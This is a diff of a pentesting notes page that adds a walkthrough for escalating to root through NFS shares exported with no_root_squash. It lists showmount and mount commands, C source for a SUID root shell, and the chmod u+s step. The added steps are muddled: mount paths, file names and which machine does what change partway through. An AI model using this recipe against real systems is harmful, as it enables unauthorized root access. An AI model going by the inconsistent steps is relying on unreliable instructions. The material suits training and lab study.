@@ -19688,14 +19688,103 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span></code></pre></div></td></tr></table></div>
 <p>By default nfs server has root_squash option on, which makes client access nobody:nogroup. To bypass it, sudo su your user to be root.</p>
 <h2 id="attacking-wrong-configured-nfs">Attacking wrong configured NFS</h2>
-<p>It is important to note that if the <code>root_squash</code> option is set, we cannot edit the <code>backup.sh</code> file even as <code>root</code>.</p>
-<p>We can also use NFS for further escalation. For example, if we have access to the system via SSH and want to read files from another folder that a specific user can read, we would need to upload a shell to the NFS share that has the <code>SUID</code> of that user and then run the shell via the SSH user.</p>
+<p>When an NFS volume is created, various options can be set:</p>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>root_squash</code></td>
+<td>If the root user is used to access NFS shares, it will be changed to the <code>nfsnobody</code> user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the <code>nfsnobody</code> user, which prevents an attacker from uploading binaries with the SUID bit set.</td>
+</tr>
+<tr>
+<td><code>no_root_squash</code></td>
+<td>Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.</td>
+</tr>
+<tr>
+<td>This configuration can be checked out in the <code>/etc/exports</code> file:</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="go">cat /etc/exports</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Enumerate NFS shares in the target:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span>
+<span class="normal"><a href="#__codelineno-4-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a># From the attacking machine
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>showmount -e $targetIP
+</span></code></pre></div></td></tr></table></div>
+<p>Output:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span>
+<span class="normal"><a href="#__codelineno-5-2">2</a></span>
+<span class="normal"><a href="#__codelineno-5-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>Export list for 10.129.2.210:
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a>/tmp             *
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3"></a>/var/nfs/general *
+</span></code></pre></div></td></tr></table></div>
+<p>In the output, the wildcard (<code>*</code>) means that the NFS (Network File System) share is exported to all clients, meaning any system can mount the exported directories. </p>
+<p>If we could access the target machine and check the <code>/etc/exports</code> we would see something similar to:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span>
+<span class="normal"><a href="#__codelineno-6-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>/var/nfs/general *(rw,no_root_squash)
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a>/tmp *(rw,no_root_squash)
+</span></code></pre></div></td></tr></table></div>
+<p>Meaning that remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. </p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
+<span class="normal"><a href="#__codelineno-7-2">2</a></span>
+<span class="normal"><a href="#__codelineno-7-3">3</a></span>
+<span class="normal"><a href="#__codelineno-7-4">4</a></span>
+<span class="normal"><a href="#__codelineno-7-5">5</a></span>
+<span class="normal"><a href="#__codelineno-7-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a># Mounting NFS Share in our attacking machine
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a>sudo su
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3"></a>mkdir target-NFS
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4"></a>mount -t nfs $ip:/ ./target-NFS/ -o nolock
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5"></a>cd target-NFS
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6"></a>tree .
+</span></code></pre></div></td></tr></table></div>
+<p>Now, from the target host we will create a binary:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span>
+<span class="normal"><a href="#__codelineno-8-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a># We can create a shell from the target machine:
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a>nano shell.c
+</span></code></pre></div></td></tr></table></div>
+<p>Content:</p>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span>
+<span class="normal"><a href="#__codelineno-9-2">2</a></span>
+<span class="normal"><a href="#__codelineno-9-3">3</a></span>
+<span class="normal"><a href="#__codelineno-9-4">4</a></span>
+<span class="normal"><a href="#__codelineno-9-5">5</a></span>
+<span class="normal"><a href="#__codelineno-9-6">6</a></span>
+<span class="normal"><a href="#__codelineno-9-7">7</a></span>
+<span class="normal"><a href="#__codelineno-9-8">8</a></span>
+<span class="normal"><a href="#__codelineno-9-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="gp">#</span>include<span class="w"> </span>&lt;stdio.h&gt;
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a><span class="gp">#</span>include<span class="w"> </span>&lt;sys/types.h&gt;
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3"></a><span class="gp">#</span>include<span class="w"> </span>&lt;unistd.h&gt;
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4"></a><span class="gp">#</span>include<span class="w"> </span>&lt;stdlib.h&gt;
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5"></a>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6"></a><span class="go">int main(void)</span>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7"></a><span class="go">{</span>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8"></a><span class="go">  setuid(0); setgid(0); system(&quot;/bin/bash&quot;);</span>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9"></a><span class="go">}</span>
+</span></code></pre></div></td></tr></table></div>
+<p>And from the target machine, we generate the binary:</p>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="go">gcc shell.c -o shell</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Now, going back to the attacker machine, where we are logged as root, we can copy that binary:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>cp shell shell2
+</span></code></pre></div></td></tr></table></div>
+<p>We now <strong>adds the "setuid" (Set User ID) permission</strong> to the <code>/mnt/shell</code> binary. </p>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a><span class="go">chmod u+s /mnt/shell</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Going back to the target machine, when we run the binary we will be root.</p>
+<p>We can also use NFS for lateral movement. For example, if we have access to the system via SSH and want to read files from another folder that a specific user can read, we would need to upload a shell to the NFS share that has the <code>SUID</code> of that user and then run the shell via the SSH user.</p>
 <h2 id="more">More</h2>
 <p><a href="https://vk9-sec.com/2049-tcp-nfs-enumeration/">https://vk9-sec.com/2049-tcp-nfs-enumeration/</a>.</p>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2024-06-11T20:27:57+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-06-11</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2025-02-16T21:39:54+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-02-16</span></small></br>
 
 
     <small>Created: June 27, 2023 18:57:41</small>
